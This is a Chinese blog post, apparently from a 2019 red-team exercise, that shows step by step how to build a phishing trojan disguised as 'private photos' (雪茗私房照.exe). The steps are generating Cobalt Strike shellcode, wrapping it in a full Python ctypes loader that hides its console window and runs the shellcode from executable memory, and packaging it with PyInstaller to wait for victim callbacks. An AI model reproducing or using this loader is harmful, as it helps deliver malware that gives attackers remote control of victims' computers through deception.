

@大家好.... hw.... 练习生 .... 唱 跳  rap 和 篮球...snowming

# 前言
此文写于护网期间（2019年6月6日），彼时刚刚回国，就碰上了护网，弥足珍贵的经历。

`雪茗私房照.exe` 主要是 [gophish+自己搭建邮件服务器](http://blog.leanote.com/post/snowming/gophish-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8) 这篇文章里面用到的木马。

在本文中，详细介绍了此木马文件的制作过程。

---------------


# 第一步、设置 Cobalt Strike 客户端中的 Listener：
![title](https://leanote.com/api/file/getImage?fileId=5daa8b33ab64412e1f00014f)

# 第二步、payload generator --> 生成shellcode

![title](https://leanote.com/api/file/getImage?fileId=5daa8b49ab64412e1f000150)

![title](https://leanote.com/api/file/getImage?fileId=5daa8b54ab64413020000173)

![title](https://leanote.com/api/file/getImage?fileId=5daa8b62ab64412e1f000151)


# 第三步、python+shellcode 得到 test.py

``` python
from ctypes import *
import ctypes


#shellcode代码


#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr

VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
       if 666==666:
              ctypes.windll.user32.ShowWindow(whnd, 0)   
              ctypes.windll.kernel32.CloseHandle(whnd)

memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))


buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))


shell = cast(memorywithshell, CFUNCTYPE(c_void_p))

shell()

```

# 第四步、使用 PyInstaller python 转 exe

![title](https://leanote.com/api/file/getImage?fileId=5daa8cecab64413020000175)

# 第五步、坐等上线

![title](https://leanote.com/api/file/getImage?fileId=5daa9cf8ab64412e1f00017a)

![title](https://leanote.com/api/file/getImage?fileId=5daa9d03ab644130200001d5)